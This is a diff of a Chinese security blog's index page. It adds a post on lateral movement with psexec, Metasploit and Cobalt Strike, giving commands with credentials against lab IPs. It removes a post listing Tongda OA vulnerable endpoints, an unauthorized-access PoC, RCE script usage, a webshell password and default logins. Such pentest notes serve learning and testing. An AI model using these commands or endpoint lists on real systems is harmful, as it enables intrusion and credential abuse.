@@ -255,6 +255,117 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="post-title-link" itemprop="url">利用psexec进行横向移动</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-13 13:08:24" itemprop="dateCreated datePublished" datetime="2022-09-13T13:08:24+08:00">2022-09-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-08 01:21:56" itemprop="dateModified" datetime="2022-12-08T01:21:56+08:00">2022-12-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="利用psexec进行横向移动"><a href="#利用psexec进行横向移动" class="headerlink" title="利用psexec进行横向移动"></a>利用psexec进行横向移动</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启，占用139、445端口)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">psexec的基本原理：</span><br><span class="line">通过ipc$连接admin$，释放二进制文件psexecsvc.exe到目标</span><br><span class="line">通过服务管理SCManager远程创建一个psexec服务，并启动服务</span><br><span class="line">客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</span><br><span class="line">运行结束后删除服务</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">psexec的使用前提：</span><br><span class="line">1.对方主机开启了 admin$共享，如果关闭了admin$共享，会提示：找不到网络名</span><br><span class="line">2.对方未开启防火墙</span><br><span class="line">3.如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</span><br><span class="line">4.如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</span><br><span class="line"></span><br><span class="line">补充</span><br><span class="line">远程机器的 139 或 445 端口需要开启状态，即 SMB；</span><br><span class="line">明文密码或者 NTLM 哈希；</span><br><span class="line">具备将文件写入共享文件夹的权限；</span><br><span class="line">能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE</span><br><span class="line">能够启动所创建的服务：SERVICE_QUERY_STATUS &amp;&amp; SERVICE_START</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用如下命令：</span><br><span class="line"></span><br><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line"></span><br><span class="line">-u：用户名</span><br><span class="line"></span><br><span class="line">-p：密码</span><br><span class="line"></span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br></pre></td></tr></table></figure>
+
+<p><code>PsExec64.exe -accepteula \\192.168.10.3 -u WIN-U8TRGT93CTR\administrator -p &lt;password&gt; -s cmd.exe</code></p>
+<p>连上大概就是这个样子，返回了一个cmd</p>
+<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220912205445125.png" alt="image-20220912205445125"></p>
+<p>这里也可以先建立ipc连接后直接调用<code>PsExec64.exe</code>调用cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.10.3\ipc$ &lt;password&gt; /user:administrator</span><br><span class="line">PsExec64.exe -accepteula \\192.168.10.3 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接执行命令（在建立ipc连接的基础上）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.10.3 ipconfig</span><br></pre></td></tr></table></figure>
+
+<h2 id="msf中的psexec"><a href="#msf中的psexec" class="headerlink" title="msf中的psexec"></a>msf中的psexec</h2><p>MSF中的psexec模块主要讲下面两个模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/psexec：该模块生成的payload是exe程序</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/psexec_psh ：该模块生成的payload主要是由powershell实现的</span><br></pre></td></tr></table></figure>
+
+<p>显然powershell生成的payload免杀效果比exe的要好，但是windows xp、server2003默认不包含powershell环境。所以，这两个模块各有各自的优势。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"></span><br><span class="line">set rhost 192.168.10.131</span><br><span class="line"></span><br><span class="line">set smbuser administrator</span><br><span class="line"></span><br><span class="line">set smbpass x123456./@</span><br><span class="line"></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">攻击成功后，会返回一个meterpreter类型的session </span><br></pre></td></tr></table></figure>
+
+<p>有些时候exe能连上但是msf上不能连上，这点需要注意。</p>
+<h2 id="cs中的psexec"><a href="#cs中的psexec" class="headerlink" title="cs中的psexec"></a>cs中的psexec</h2><p>g，服务器在国外，好像被墙了，上不了线。</p>
+<p>偷别人的图</p>
+<p>查看目标所在网段其它主机<br>扫描主机</p>
+<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/5.png" alt="在这里插入图片描述"></p>
+<p>列出主机</p>
+<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1.png" alt="在这里插入图片描述"></p>
+<p>使用PsExec横向移动</p>
+<p>右键要横向的目标主机，选择psexec的版本（32位64位或PowerShell）。</p>
+<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/2.png" alt="在这里插入图片描述"></p>
+<p>选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。</p>
+<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/3.png" alt="在这里插入图片描述"></p>
+<p>点击Launch，即会返回一个DC-1的session。</p>
+<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/4.png" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -852,95 +963,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/07/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/07/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" class="post-title-link" itemprop="url">通达oa漏洞合集</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-09-07 14:26:01 / 修改时间：14:26:24" itemprop="dateCreated datePublished" datetime="2022-09-07T14:26:01+08:00">2022-09-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="通达oa漏洞合集"><a href="#通达oa漏洞合集" class="headerlink" title="通达oa漏洞合集"></a>通达oa漏洞合集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http[s]://TongDaOA.domain/inc/expired.php 判断通达版本</span><br><span class="line">http[s]://TongDaOA.domain/inc/reg_trial.php</span><br><span class="line">http[s]://TongDaOA.domain/inc/reg_trial_submit.php</span><br><span class="line">http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php</span><br><span class="line">GET 参数username、email 可爆用户、邮箱</span><br><span class="line">http[s]://TongDaOA.domain/resque/worker.php 计算机名</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">2013-2017(SQLi path)</span><br><span class="line"></span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/select/getData.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/select/getValue.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/select/index.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/share/update.php </span><br><span class="line">http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php</span><br><span class="line">http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID=</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/account_care_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/action_link_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/contract_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/contract_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/payment_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/storage_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/ispirit/myoa.php</span><br><span class="line">http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v11~v11.6 [0day]</span><br><span class="line"></span><br><span class="line">http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php</span><br><span class="line">http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php</span><br><span class="line">http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php</span><br><span class="line">http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php</span><br><span class="line">http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php</span><br><span class="line">http[s]://TongDaOA.domain/general/reportshop/design/report/action.php</span><br><span class="line">http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php</span><br><span class="line">http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php</span><br><span class="line">http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php</span><br><span class="line">http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php</span><br><span class="line">http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php</span><br><span class="line">http[s]://TongDaOA.domain/interface/GetNewAPP.php</span><br><span class="line">http[s]://TongDaOA.domain/interface/GetNewAPP1.php</span><br><span class="line">http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php</span><br><span class="line">http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v11.6 [RCE]</span><br><span class="line"></span><br><span class="line">http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除</span><br></pre></td></tr></table></figure>
-
-<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">未授权访问各种会议通知信息</span><br><span class="line">poc:</span><br><span class="line">/general/calendar/arrange/get_cal_list.php?starttime=1548058874&amp;endtime=1597997506&amp;view=agendaDay</span><br></pre></td></tr></table></figure>
-
-<h2 id="批量写吗"><a href="#批量写吗" class="headerlink" title="批量写吗"></a>批量写吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、影响版本：</span><br><span class="line">    tongdaOA V11</span><br><span class="line">    tangdaOA 2017</span><br><span class="line">    tangdaOA 2016</span><br><span class="line">    tangdaOA 2015</span><br><span class="line">    tangdaOA 2013 增强版</span><br><span class="line">    tangdaOA 2013</span><br><span class="line">2、已经测试版本</span><br><span class="line">    v2017 </span><br><span class="line">    v11    </span><br><span class="line">3、出处</span><br><span class="line">    https://github.com/NS-Sp4ce/TongDaOA-Fake-User</span><br><span class="line">    https://github.com/jas502n/OA-tongda-RCE    </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4、脚本在本地</span><br><span class="line">    ～/tools/tongda_oa_rce</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5、使用方法</span><br><span class="line">    python3 tongda.py http://www.xxx.com:8086        #通达oa界面</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6、木马链接密码</span><br><span class="line">    a</span><br></pre></td></tr></table></figure>
-
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认密码后台源代码有</span><br><span class="line">    111111</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认用户名</span><br><span class="line">    root</span><br><span class="line">    admin</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1012,7 +1034,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">172</span>
+          <span class="site-state-item-count">173</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
